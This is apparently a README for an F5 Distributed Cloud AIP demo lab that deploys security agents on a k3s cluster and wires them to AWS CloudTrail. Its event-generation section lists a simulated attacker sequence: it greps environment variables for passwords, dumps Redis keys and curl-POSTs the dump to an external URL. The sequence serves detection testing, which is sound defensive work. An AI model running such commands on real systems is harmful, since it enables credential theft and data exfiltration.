XC AIP Demo with CloudTrail integration
==============================
This blueprint allows you to automatically deploy AIP agents into an existing kubernetes cluster (k3s) running across 2 nodes in UDF. Additionally this blueprint leverages AWS cloud account to configure and integrate AWS CloudTrail with AIP automatically.

What you need to do **BEFORE starting the deployment:**
-------------------------------------------------------

## Copy AIP keys and Account ID


1. Login to F5 Distributed Cloud tenant where you would like AIP to be connected to
2. Navigate to *App Infrastructure Protection* -> **YOUR ORG (mapped NS in XC)** ->*Settings* -> *Keys*
3. Copy the following values:
    - **Deployment Key**
    - **REST API Key**
    - **Organization ID**
    - **User ID**

4. Navigate to *Settings* -> *Integrations* -> *Click on "ADD AWS INTEGRATION"
5. Copy **Account ID** value (*Note: for F5 internal tenants Account ID is always 896126563706*)

## Populate User Tags and User-data script


1. In this UDF blueprint locate **CONFIGURE ME** Ubuntu server and click **DETAILS**
2. **Documentation** page contains User Tags where you need to define 3 tags: ORG, USER and ACCOUNT. See Description on the top of the page for instructions
3. Navigate to **Details** page and edit **Custom Userdata** script. You need to insert **YOUR Deployment Key** and **YOUR REST API Key**

## Start the deployment

Startup script will perform the following actions to integrate 3 agents (1 on each node plus 1 agent that "listens" to k8s API) and AWS CloudTrail:

 1. Gather data from env file and UDF metadata (user tags)
 2. Deploy stack using Cloudformation template
 3. Create integration on AIP side and gather External ID
 4. Update stack with AIP External ID
 5. Create CloudTrail resources in AIP

## Generating the events

There is a "rogue" pod that will be generating events. The pod uses the following commands to simulate the adversary:

```
kubectl apply -f pod.yaml
kubectl exec redis-client -- env |grep -i pass
REDISCLI_AUTH="$REDIS_PASSWORD" /usr/local/bin/redis-cli -h redis-cluster-master keys \* > my.db
curl --connect-timeout 1 -X POST -F "image=@my.db" https://f5se.com/data/db/my/1.db
```

This behavior is in line with the attacker locating redis DB and exfiltrating DB data to an arbitrary URL

## Enabling Rules

In order for the system to generate *Alerts* it is necessary to enable corresponding **Rule Sets**. Navigate to *Rules* and enable the following Rule Sets:

  1. Base Rule Set
  2. Docker Rule Set
  3. Cloud Trail Rule Set
  4. Kubernetes Rule Set

Additionally, under **RULE TYPE** select the following types and ensure all rules under these types are enabled:

  1. Cloud Trail
  2. File Integrity
  3. Host
  4. Kubernetes Audit
